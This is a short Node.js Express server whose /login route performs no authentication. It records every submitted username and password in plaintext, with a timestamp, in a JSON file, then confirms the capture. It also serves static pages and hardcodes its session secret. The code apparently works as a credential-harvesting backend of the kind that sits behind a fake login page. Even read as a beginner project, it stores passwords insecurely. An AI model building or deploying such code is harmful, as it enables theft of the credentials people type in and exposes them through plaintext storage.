const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const session = require('express-session');
const fs = require('fs'); // ✅ For saving login data

const app = express();

// Middleware for reading form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (HTML, CSS, JS)
app.use(express.static(path.join(__dirname, 'public')));

// Session (not really used, but okay to leave)
app.use(
  session({
    secret: 'mysecretkey',
    resave: false,
    saveUninitialized: true,
  })
);

// ✅ LOGIN ROUTE — Save attempts to JSON
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Create a new entry
  const newEntry = {
    username: username,
    password: password,
    time: new Date().toLocaleString()
  };

  const filePath = 'login-data.json';

  // Read existing file
  fs.readFile(filePath, 'utf8', (err, data) => {
    let loginData = [];

    if (!err && data) {
      try {
        loginData = JSON.parse(data);
      } catch (e) {
        console.error('Error parsing existing JSON, starting fresh.');
      }
    }

    // Add the new attempt to the list
    loginData.push(newEntry);

    // Write updated list back to the file
    fs.writeFile(filePath, JSON.stringify(loginData, null, 2), (err) => {
      if (err) {
        console.error('Error saving login data:', err);
        return res.status(500).send('Error saving login attempt');
      }
      console.log('Saved login attempt:', newEntry);
      res.send('Login data saved successfully!');
    });
  });
});

// ✅ Use Render's port OR default to 3000
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
